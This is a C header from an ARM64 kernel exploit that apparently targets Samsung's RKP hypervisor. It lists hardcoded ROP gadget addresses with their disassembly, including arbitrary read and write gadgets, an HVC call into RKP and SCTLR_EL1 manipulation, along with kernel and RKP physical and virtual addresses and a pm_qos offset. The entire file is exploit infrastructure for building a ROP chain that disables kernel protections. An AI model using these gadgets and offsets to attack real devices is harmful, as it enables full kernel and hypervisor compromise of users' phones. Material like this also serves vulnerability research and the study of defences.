#ifndef __SYMBOLS_H__
#define __SYMBOLS_H__

/**
 * A garbage value used in the ROP chain.
 */
#define GARBAGE_VALUE (0xABCDABCDABCDABCDULL)

/**
 * The offset of the lpass entry in pm_qos from the original kernel virtual
 * base address.
 */
#define LPASS_OFFSET (0xC0027DA718LL)

/**
 * self:
 *  B self
 */
#define B_SELF (0xFFFFFFC00009A208ULL)

/**
 * LDP             X19, X20, [SP,#0x10]
 * LDP             X21, X22, [SP,#0x20]
 * LDP             X23, X24, [SP,#0x30]
 * LDP             X25, X26, [SP,#0x40]
 * LDR             X27, [SP,#0x50]
 * LDP             X29, X30, [SP],#0x60
 * RET
 */
#define LDP_X19_to_X30_RET (0xFFFFFFC000082184ULL)

/**
 * LDP             X0, X1, [SP]
 * LDP             X2, X3, [SP,#0x10]
 * LDP             X4, X5, [SP,#0x20]
 * LDP             X6, X7, [SP,#0x30]
 * LDR             X16, [X27,X26,LSL#3]
 * BLR             X16
 */
#define LDP_X0_to_X7_BLR_X16 (0xFFFFFFC0000854F4ULL)

/**
 * BLR             X7
 * LDP             X29, X30, [SP],#0x10
 * RET
 */
#define BLR_X7_POP_X29_X30_RET (0xFFFFFFC00013DB28ULL)

/**
 * MOV             X0, #0x1
 * RET
 */
#define RET_ONE (0xFFFFFFC00035F4C8ULL)

/**
 * LDP             X29, X30, [SP,#0x80]
 * ADD             SP, SP, #0x90
 * RET
 */
#define LDP_X29_X30_OFFSET_0x80_RET (0xFFFFFFC00074126CULL)

/**
 * STR             X0, [X19]
 * LDP             X19, X20, [SP,#0x10]
 * LDP             X29, X30, [SP],#0x20
 * RET
 */
#define STR_X0_X19_LDP_X19_X20_X29_X30_RET (0xFFFFFFC000131760ULL)

/**
 * LDR             X0, [X0]
 * RET
 */
#define READ_GADGET (0xFFFFFFC000165F04ULL)

/**
 * STR             X1, [X0]
 * RET
 */
#define WRITE_GADGET (0xFFFFFFC0000F9E54ULL)

/**
 * HVC             #0
 * RET
 */
#define RKP_CALL (0xFFFFFFC000092630ULL)

/**
 * MSR             #0, c1, c0, #0, X0
 * RET
 */
#define SET_SCTLR_EL1 (0xFFFFFFC00123C224ULL)

/**
 * MRS             X0, #0, c1, c0, #0
 * RET
 */
#define GET_SCTLR_EL1 (0xFFFFFFC00123C22CULL)

/**
 * SYS             #0, c8, c3, #0
 * RET
 */
#define TLBIVMALLE1IS (0xFFFFFFC001243B50ULL)

/**
 * The physical base address for the kernel range (not necessarily the actual kernel
 * base, since there's a KASLR slide involved).
 */
#define KERNEL_PHYS_BASE (0x80000000ULL)

/**
 * The path of uevent_seqnum's value.
 */
#define UEVENT_SEQNUM (0xFFFFFFC00203A338ULL)

/**
 * An address in the kernel VAS corresponding to RKP code, in which we'll observe a change.
 */
#define RKP_CODE_VIRT_ADDR (0xFFFFFFC00123C000ULL)

/**
 * The virtual address of the rkp_pgt_bitmap in the kernel VAS.
 */
#define RKP_BITMAP_VIRT_ADDR (0xFFFFFFC0011F9000ULL)

/**
 * The physical to virtual offset for addresses in the EL1 kernel range.
 */
#define PHYS_TO_VIRT_OFF (0xffffffbf80000000ULL)

/**
 * The virtual to phyiscal offset for addresses in the EL1 kernel range.
 */
#define VIRT_TO_PHYS_OFF (0x4000000000ULL + 0x80000000ULL)

/**
 * The base physical address of RKP.
 */
#define RKP_PHYS_BASE (0xb0500000)

#endif
